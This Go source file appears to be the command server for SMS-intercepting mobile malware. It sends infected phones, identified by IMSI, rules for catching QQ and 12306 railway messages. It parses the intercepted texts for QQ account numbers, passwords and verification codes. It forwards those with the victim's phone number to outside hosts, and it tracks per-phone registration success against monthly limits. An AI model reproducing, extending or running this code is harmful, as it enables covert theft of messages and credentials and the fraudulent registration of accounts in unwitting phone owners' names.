package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func logSendC(info InfoRequest) {
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
	sql := `insert into log_async_generals (id,logId,para01,para02,para03,para04,para05,para06,para07) values (?,?,?,?,?,?,?,?,?)`
	insert(dbLog, sql, id, 311, info.Imsi, info.Mobile, info.Ip, info.Msg, info.Code, info.Cid, info.Apid)
}

func logGetC(info InfoRequest) {
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	id := time.Now().UnixNano()/1e2 + int64(random.Intn(10000))
	sql := `insert into log_async_generals (id,logId,para01,para02,para03,para04,para05) values (?,?,?,?,?,?,?)`
	insert(dbLog, sql, id, 301, info.Imsi, info.Ip, info.Cid, info.Mobile, info.Resp)
}

func sendC(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("error begin:")
			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
			fmt.Println("error end:")
		}
	}()
	w.Write([]byte("<datas><stats>1</stats></datas>"))
	// fmt.Fprintf(w, "Hello, %s", html.EscapeString(req.URL.Path))
	fmt.Println("sendC RawQuery, %s", r.URL.RawQuery)
	// req.ParseForm()
	// msg := r.Form["msg"]
	msg := r.FormValue("msg")
	user := getUserByImsi(r.FormValue("imsi"))
	fmt.Println("Get form, %s", msg)
	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Msg: r.FormValue("msg"), Code: r.FormValue("code"), Cid: r.FormValue("cid"), Apid: r.FormValue("apid"), Mobile: (*user)["mobile"]}
	go logSendC(infoLog)
	if strings.EqualFold(r.FormValue("apid"), "4") {
		processQqRegister(msg, *user)
	} else if strings.EqualFold(r.FormValue("apid"), "5") {
		process12306Register(msg, *user)
	}
}

func processQqRegister(msg string, user map[string]string) {
	exp := regexp.MustCompile(`您获得QQ号(\S*),密`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		fmt.Println(result[1])
		qq := result[1]
		if strings.Contains(msg, "。本") {
			exp = regexp.MustCompile(`密码(\S*)。本`)
		} else if strings.Contains(msg, "。已") {
			exp = regexp.MustCompile(`密码(\S*)。已`)
		} else if strings.Contains(msg, "。欢") {
			exp = regexp.MustCompile(`密码(\S*)。欢`)
		} else {
			fmt.Println("processQqRegister can not match Password")
			return
		}
		result = exp.FindStringSubmatch(msg)
		if nil != result {
			pwd := result[1]
			go sendQqtoUrl(qq, pwd, user)
			go updateRegisterUserSuccess(user, "registerQqSuccessCount")
		}
	} else {
		fmt.Println("processQqRegister can not match:%s", msg)
	}
}
func process12306Register(msg string, user map[string]string) {
	exp := regexp.MustCompile(`码：(\S*)。如`)
	result := exp.FindStringSubmatch(msg)
	if nil != result {
		fmt.Println(result[1])
		pwd := result[1]
		go send12306toUrl(pwd, user)
		go updateRegisterUserSuccess(user, "register12306SuccessCount")
	} else {
		fmt.Println("process12306Register can not match:%s", msg)
	}
}
func send12306toUrl(pwd string, user map[string]string) {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("error begin:")
			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
			fmt.Println("error end:")
		}
	}()
	//生成client 参数为默认
	client := &http.Client{}
	mobile := user["mobile"]
	if len([]rune(user["mobile"])) == 13 {
		mobile = mobile[2:13]
	}
	//生成要访问的url
	// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
	url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
	fmt.Println(url)
	//提交请求
	reqest, err := http.NewRequest("GET", url, nil)

	if err != nil {
		panic(err)
	} else {
		//处理返回结果
		response, _ := client.Do(reqest)

		//将结果定位到标准输出 也可以直接打印出来 或者定位到其他地方进行相应的处理
		stdout := os.Stdout
		_, err = io.Copy(stdout, response.Body)
		fmt.Println()

		//返回的状态码
		status := response.StatusCode

		fmt.Println(status)
	}

}

func sendQqtoUrl(qq string, pwd string, user map[string]string) {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("error begin:")
			fmt.Println(err) // 这里的err其实就是panic传入的内容
			fmt.Println("error end:")
		}
	}()
	//生成client 参数为默认
	client := &http.Client{}
	mobile := user["mobile"]
	if len([]rune(user["mobile"])) == 13 {
		mobile = mobile[2:13]
	}
	//生成要访问的url
	// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
	url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=qq114&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
	fmt.Println(url)
	//提交请求
	reqest, err := http.NewRequest("GET", url, nil)

	if err != nil {
		panic(err)
	} else {
		//处理返回结果
		response, _ := client.Do(reqest)

		//将结果定位到标准输出 也可以直接打印出来 或者定位到其他地方进行相应的处理
		stdout := os.Stdout
		_, err = io.Copy(stdout, response.Body)
		fmt.Println()

		//返回的状态码
		status := response.StatusCode

		fmt.Println(status)
	}

}

func testC(w http.ResponseWriter, r *http.Request) {
	fmt.Println("testC RawQuery, %s", r.URL.RawQuery)
}

const DEFAULT_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>333</kno><kw>a*b</kw><apid>1</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"

// const REGISTER_GETC = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>106</kno><kw>注册微信帐号，验证码*。请</kw><apid>100</apid></data><data><kno>135</kno><kw>验证码*。</kw><apid>100</apid></data></da></datas>"
const REGISTER_GETC_QQ = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>106</kno><kw>QQ*密码</kw><apid>4</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"
const REGISTER_GETC_12306 = "<datas><cfg><durl></durl><vno></vno><stats>1</stats></cfg><da><data><kno>12306</kno><kw>铁路客服*验证码</kw><apid>5</apid></data><data><kno>334</kno><kw>a*b</kw><apid>2</apid></data><data><kno>335</kno><kw>a*b</kw><apid>3</apid></data></da></datas>"
const TRY_MORE_TIMES = 2 //多余指令尝试次数

func getC(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("error begin:")
			fmt.Println(err) // 这里的err其实就是panic传入的内容
			fmt.Println("error end:")
		}
	}()
	start := time.Now()
	var resp string
	user := getUserByImsi(r.FormValue("imsi"))
	fmt.Println(*user)
	// && strings.EqualFold((*user)["province"], "广东")
	if strings.EqualFold(mapConfig["openRegisterGet"], "open") && len([]rune((*user)["mobile"])) >= 11 && checkUserRegister(*user) {
		//choose register content
		resp = chooseRegisterContent(*user)
	} else {
		resp = DEFAULT_GETC
		if !(strings.EqualFold((*user)["lastRegisterCmdAppIdList"], "NULL") || strings.EqualFold((*user)["lastRegisterCmdAppIdList"], "")) {
			go cleanRegisterUserCmdList(*user)
		}
	}
	w.Write([]byte(resp))

	fmt.Println("getC RawQuery,", r.URL.RawQuery)

	infoLog := InfoRequest{Imsi: r.FormValue("imsi"), Ip: processIp(r.RemoteAddr), Cid: r.FormValue("cid"), Mobile: (*user)["mobile"], Resp: resp}
	end := time.Now()
	go logGetC(infoLog)
	fmt.Println("getc total time(s):", end.Sub(start).Seconds())
}

func chooseRegisterContent(user map[string]string) string {
	var result string
	appList := ""
	//请注意这里有相当于硬编码的执行顺序
	if strings.EqualFold(mapConfig["registerSmsGet12306"], "open") && checkSmsRegister(user, "register12306CmdCount", "register12306SuccessCount", "12306RegisterLimit") {
		result = REGISTER_GETC_12306
		appList = ",5,"
	} else if strings.EqualFold(mapConfig["registerSmsGetQq"], "open") && checkSmsRegister(user, "registerQqCmdCount", "registerQqSuccessCount", "qqRegisterLimit") {
		result = REGISTER_GETC_QQ
		appList = ",4,"
	} else {
		result = DEFAULT_GETC
		go cleanRegisterUserCmdList(user)
	}
	if !strings.EqualFold(appList, "") {
		go processRegisterUser(user, appList)
	}
	return result
}

func checkSmsRegister(user map[string]string, cmdParaName string, successParaName string, sysLimitName string) bool {
	if strings.EqualFold(user[cmdParaName], "NULL") { // 从来没有生成过指令
		return true
	} else {
		_registerCmdCount, _ := strconv.ParseInt(user[cmdParaName], 10, 8)
		_sysLimit, _ := strconv.ParseInt(mapConfig[sysLimitName], 10, 8)
		if _registerCmdCount-_sysLimit >= TRY_MORE_TIMES { // 生成指令超过限制次数
			return false
		} else {
			if strings.EqualFold(user[successParaName], "NULL") { //如果还没成功过
				return true
			} else {
				_registerSuccessCount, _ := strconv.ParseInt(user[successParaName], 10, 8)
				if _registerSuccessCount >= _sysLimit { //成功次数判定
					return false
				} else {
					return true
				}
			}
		}
	}
}

func getUserByImsi(imsi string) *map[string]string {
	row, _ := fetchRow(dbConfig, "SELECT * FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,'8612345678901'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  ?", imsi)
	return row
}

func processRegisterUser(user map[string]string, appListStr string) {
	var sql string
	lastRegisterTime, _ := strconv.ParseInt(user["lastRegisterTime"], 10, 64)
	if time.Now().Sub(time.Unix(lastRegisterTime, 0)).Hours() > 744 {
		sql = "update imsi_users set lastRegisterTime = ? , lastRegisterCmdAppIdList =? , registerCountMonth = 1  where imsi=?"
	} else {
		sql = "update imsi_users set lastRegisterTime = ? , lastRegisterCmdAppIdList =? , registerCountMonth = registerCountMonth+1  where imsi=?"
	}
	exec(dbConfig, sql, time.Now().Unix(), appListStr, user["imsi"])
}

func cleanRegisterUserCmdList(user map[string]string) {
	sql := "update imsi_users set  lastRegisterCmdAppIdList =''   where imsi=?"
	exec(dbConfig, sql, user["imsi"])
}

func updateRegisterUserSuccess(user map[string]string, paraName string) {
	sql := "update imsi_users set  " + paraName + " =ifnull(" + paraName + ",0)+1   where imsi=?"
	exec(dbConfig, sql, user["imsi"])
}

func processIp(ori string) string {
	i := strings.LastIndex(ori, ":")
	if i >= 0 {
		return ori[0:i]
	} else {
		return ori
	}
}

func timerMinute() {
	for {
		time.Sleep(time.Minute)
		loadGlobalConfigFromDb()
	}
}

//need process return true
func checkUserRegister(user map[string]string) bool {
	_lastRegisterTime, _ := strconv.ParseInt(user["lastRegisterTime"], 10, 64)
	if len([]rune(user["lastRegisterTime"])) <= 4 { // 上次注册配置拉取时间是否为空
		return true
	} else if time.Now().Sub(time.Unix(_lastRegisterTime, 0)).Hours() > 744 { // 上次注册配置拉取时间是否超过31天
		return true
	} else if strings.EqualFold(user["registerCountMonth"], "NULL") { // 本月拉取次数是否超过
		return true
	} else if len([]rune(user["registerCountMonth"])) > 0 {
		_userCount, _ := strconv.ParseInt(user["registerCountMonth"], 10, 8)
		_sysLimit, _ := strconv.ParseInt(mapConfig["registerMonthLimit"], 10, 8)
		if _userCount < _sysLimit { // 是否超过月次数总限制
			return true
		} else {
			return false
		}
	} else {
		return false
	}
}

type DbConfigure struct {
	UserName      string `json:"UserName"`
	Password      string `json:"Password"`
	ServerAddress string `json:"ServerAddress"`
	Port          int    `json:"Port"`
	Database      string `json:"Database"`
}

type DbConfigs struct {
	DbLog    DbConfigure `json:"DbLog"`
	DbConfig DbConfigure `json:"DbConfig"`
}

type InfoRequest struct {
	Imsi   string
	Ip     string
	Msg    string
	Code   string
	Cid    string
	Apid   string
	Resp   string
	Mobile string
}

var (
	config     *DbConfigs
	configLock = new(sync.RWMutex)
)

var dbLog *sql.DB
var dbConfig *sql.DB
var mapConfig map[string]string

func init() {

	mapConfig = make(map[string]string)
	if !loadFileConfig() {
		os.Exit(1)
	}

	//热更新配置可能有多种触发方式，这里使用系统信号量sigusr1实现
	// s := make(chan os.Signal, 1)
	// signal.Notify(s, syscall.SIGUSR1)
	// go func() {
	// 	for {
	// 		<-s
	// 		log.Println("Reloaded config:", loadFileConfig())
	// 	}
	// }()

	dbLog, _ = sql.Open("mysql", config.DbLog.UserName+":"+config.DbLog.Password+"@tcp("+config.DbLog.ServerAddress+":"+fmt.Sprintf("%d", config.DbLog.Port)+")/"+config.DbLog.Database+"?charset=utf8")
	dbLog.SetMaxOpenConns(20)
	dbLog.SetMaxIdleConns(10)
	dbLog.Ping()
	err := dbLog.Ping()
	if err != nil {
		log.Fatal(err)
	}
	dbConfig, _ = sql.Open("mysql", config.DbConfig.UserName+":"+config.DbConfig.Password+"@tcp("+config.DbConfig.ServerAddress+":"+fmt.Sprintf("%d", config.DbConfig.Port)+")/"+config.DbConfig.Database+"?charset=utf8")
	dbConfig.SetMaxOpenConns(20)
	dbConfig.SetMaxIdleConns(10)
	dbConfig.Ping()
	err = dbConfig.Ping()
	if err != nil {
		log.Fatal(err)
	}
	loadGlobalConfigFromDb()
	go timerMinute()
	fmt.Println("init end.")
}

func loadGlobalConfigFromDb() {
	resultArray, _ := fetchRows(dbConfig, "SELECT * FROM system_configs")
	// map1 := make(map[string]string)
	// for index := 0; index < len(*resultArray); index++ {
	// 	(*mapConfig)[(*resultArray)[index]["title"]] = (*resultArray)[index]["detail"]
	// }
	for _, value := range *resultArray {
		mapConfig[value["title"]] = value["detail"]
	}
	// *mapConfig = map1
	fmt.Println(mapConfig)
}

func loadFileConfig() bool {
	f, err := ioutil.ReadFile("config.json")
	if err != nil {
		fmt.Println("load config error: ", err)
		return false
	}

	//不同的配置规则，解析复杂度不同
	temp := new(DbConfigs)
	err = json.Unmarshal(f, &temp)
	if err != nil {
		fmt.Println("Para config failed: ", err)
		return false
	}

	configLock.Lock()
	config = temp
	configLock.Unlock()
	return true
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println("error begin:")
			fmt.Println(err) // 这里的err其实就是panic传入的内容，55
			fmt.Println("error end:")
		}
	}()
	server := &http.Server{
		Addr:         ":8090",
		ReadTimeout:  3 * time.Second,
		WriteTimeout: 5 * time.Second,
	}
	http.HandleFunc("/ss/sendc", sendC)
	http.HandleFunc("/ss/getc", getC)
	http.HandleFunc("/ss/testc", testC)
	server.ListenAndServe()
	fmt.Println((*server).ReadTimeout)

	// server := http.ListenAndServe(":8090", nil)
	// fmt.Println(server.ReadTimeout)
}

//插入
func insert(db *sql.DB, sqlstr string, args ...interface{}) (int64, error) {
	stmtIns, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtIns.Close()

	result, err := stmtIns.Exec(args...)
	if err != nil {
		panic(err.Error())
	}
	stmtIns.Close()
	return result.LastInsertId()
}

//修改和删除
func exec(db *sql.DB, sqlstr string, args ...interface{}) (int64, error) {
	stmtIns, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtIns.Close()

	result, err := stmtIns.Exec(args...)
	if err != nil {
		panic(err.Error())
	}
	stmtIns.Close()
	return result.RowsAffected()
}

//取一行数据，注意这类取出来的结果都是string
func fetchRow(db *sql.DB, sqlstr string, args ...interface{}) (*map[string]string, error) {
	stmtOut, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtOut.Close()

	rows, err := stmtOut.Query(args...)
	if err != nil {
		panic(err.Error())
	}

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}

	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))
	ret := make(map[string]string, len(scanArgs))

	for i := range values {
		scanArgs[i] = &values[i]
	}
	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string

		for i, col := range values {
			if col == nil {
				value = "NULL"
			} else {
				value = string(col)
			}
			ret[columns[i]] = value
		}
		break //get the first row only
	}
	rows.Close()
	stmtOut.Close()
	return &ret, nil
}

//取多行,注意这类取出来的结果都是string
func fetchRows(db *sql.DB, sqlstr string, args ...interface{}) (*[]map[string]string, error) {
	stmtOut, err := db.Prepare(sqlstr)
	if err != nil {
		panic(err.Error())
	}
	// defer stmtOut.Close()

	rows, err := stmtOut.Query(args...)
	if err != nil {
		panic(err.Error())
	}

	columns, err := rows.Columns()
	if err != nil {
		panic(err.Error())
	}

	values := make([]sql.RawBytes, len(columns))
	scanArgs := make([]interface{}, len(values))

	ret := make([]map[string]string, 0)
	for i := range values {
		scanArgs[i] = &values[i]
	}

	for rows.Next() {
		err = rows.Scan(scanArgs...)
		if err != nil {
			panic(err.Error())
		}
		var value string
		vmap := make(map[string]string, len(scanArgs))
		for i, col := range values {
			if col == nil {
				value = "NULL"
			} else {
				value = string(col)
			}
			vmap[columns[i]] = value
		}
		ret = append(ret, vmap)
	}
	rows.Close()
	stmtOut.Close()
	return &ret, nil
}
